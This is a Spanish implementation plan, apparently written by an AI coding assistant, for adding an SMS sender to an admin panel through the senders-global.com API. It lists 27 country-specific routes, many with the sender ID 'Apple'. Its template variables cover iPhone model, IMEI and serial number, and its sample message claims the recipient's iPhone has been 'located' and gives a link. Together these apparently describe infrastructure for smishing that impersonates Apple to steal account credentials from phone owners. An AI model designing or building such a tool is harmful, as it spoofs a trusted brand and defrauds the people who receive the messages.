
# Plan: Implementar Sistema de SMS con Senders-Global API

## Resumen

Implementar una nueva funcionalidad de envío de SMS usando la API de senders-global.com, que funcionará en paralelo con el sistema de WhatsApp existente. El admin podrá elegir entre enviar por WhatsApp o SMS, y cuando seleccione SMS, podrá elegir entre diferentes "senders" (remitentes) según el país del destinatario.

## Arquitectura de la Solución

```text
+------------------+     +------------------+     +------------------+
|   Admin Panel    |     |   Edge Function  |     | Senders-Global   |
|   (SMS Sender)   | --> | send-sms         | --> | API              |
+------------------+     +------------------+     +------------------+
        |                        |
        v                        v
+------------------+     +------------------+
| Plantillas SMS   |     |  Mensajes Table  |
| (message_templates)    | (registro SMS)   |
+------------------+     +------------------+
```

## Cambios a Implementar

### 1. Nueva Edge Function: `send-sms`

Crear una nueva edge function para enviar SMS mediante la API de senders-global.com:

- Recibir parametros: `number`, `message`, `api_id`, `sender_id`
- Hacer llamada a la API con los credenciales guardados
- Registrar el mensaje enviado en la base de datos

### 2. Nuevo Componente: `SmsSender.tsx`

Crear un componente modal/dialog para enviar SMS:

- Selector de Sender (lista de 27 opciones con pais/operadora)
- Campos de codigo de pais + numero de telefono
- Selector de plantilla existente (de `message_templates`)
- Textarea para previsualizar/editar el mensaje
- Variables disponibles: `{{model}}`, `{{url}}`, `{{time}}`, `{{date}}`
- Boton "Enviar mensaje"

### 3. Actualizar Panel Admin

Agregar nueva seccion "SMS Sender" en el menu del AdminDashboard:

- Icono: MessageSquare o similar
- Acceso directo al componente SmsSender

### 4. Configuracion de API SMS

Agregar en `InstanceSettings.tsx`:

- Campo para API Key de senders-global
- Campo para API Token de senders-global

### 5. Guardar Credenciales en Base de Datos

Agregar nuevas claves en `system_settings`:

- `sms_api_key`: La API key
- `sms_api_token`: El API token

---

## Detalles Tecnicos

### Lista de Senders Disponibles

```text
api_id | sender_id | Descripcion
-------|-----------|------------------------------------------
1      | Apple     | Claro Peru PE (Semi Mundial)
2      | short8    | Claro AR
3      | short2    | Argentina AR Movistar
4      | short6    | Argentina AR Personal
5      | Apple     | Espana ES
6      | info      | Costa Rica CR (All Companies)
7      | short1    | Bitel/Movistar Peru
8      | short1    | Argentina AR Premium (Todas)
10     | short     | El Salvador SV / Nicaragua NI
11     | usa2      | USA Long/Code
12     | short9    | Ecuador EC / Entel Peru
13     | short0    | Bolivia BO Entel
14     | Apple     | Bolivia BO Nuevatel
15     | Apple     | Bolivia BO Tigo
16     | Apple     | Italia IT
17     | short5    | Colombia CO (Tigo/Claro/Wom)
18     | usa       | Premium Worldwide Long/Code
19     | short     | Honduras HN / Guatemala (Claro Only)
21     | short     | Brazil BR
22     | short     | Dominican Republic DO (Claro Only)
23     | short     | Mexico MX Premium
24     | short     | Chile CL (All Company)
25     | Apple     | Paraguay PY
26     | usa       | Dominican Republic DO (All Companies)
28     | Apple     | Mexico MX Premium
29     | Apple     | Iran IR Premium
30     | Apple     | Francia FR
31     | short     | Panama PA
```

### Formato de Plantilla SMS

Las plantillas existentes se pueden reutilizar con estas variables:

- `{{model}}` - Modelo del dispositivo (ej: iPhone 15 Pro Max)
- `{{url}}` - URL del proceso
- `{{time}}` - Hora actual
- `{{date}}` - Fecha actual
- `{{imei}}` - IMEI del dispositivo
- `{{serial}}` - Numero de serie

### Ejemplo de Mensaje SMS

```text
Su iPhone 15 Pro Max ha sido localizado hoy a las 2026-02-03 21:00:07 GMT.
Ultimo registro: https://ejemplo.com/ubicacion
```

---

## Archivos a Crear/Modificar

| Archivo | Accion | Descripcion |
|---------|--------|-------------|
| `supabase/functions/send-sms/index.ts` | Crear | Edge function para enviar SMS |
| `src/components/SmsSender.tsx` | Crear | Componente principal para enviar SMS |
| `src/pages/AdminDashboard.tsx` | Modificar | Agregar seccion SMS Sender al menu |
| `src/components/InstanceSettings.tsx` | Modificar | Agregar campos para API SMS |
| `src/utils/smsSenders.ts` | Crear | Lista de senders disponibles |

---

## Flujo de Usuario

1. Admin va a "SMS Sender" en el panel
2. Selecciona un sender de la lista (segun pais/operadora del destino)
3. Ingresa codigo de pais + numero de telefono
4. Selecciona una plantilla o escribe mensaje personalizado
5. El mensaje se previsualiza con las variables reemplazadas
6. Click en "Enviar mensaje"
7. Se envia via edge function a senders-global.com
8. Se registra en la base de datos
9. Se muestra confirmacion de exito/error

---

## Seguridad

- Las credenciales de la API se guardan en `system_settings` (solo admin puede acceder)
- La edge function valida que el usuario sea admin antes de enviar
- Los mensajes enviados se registran para auditoria
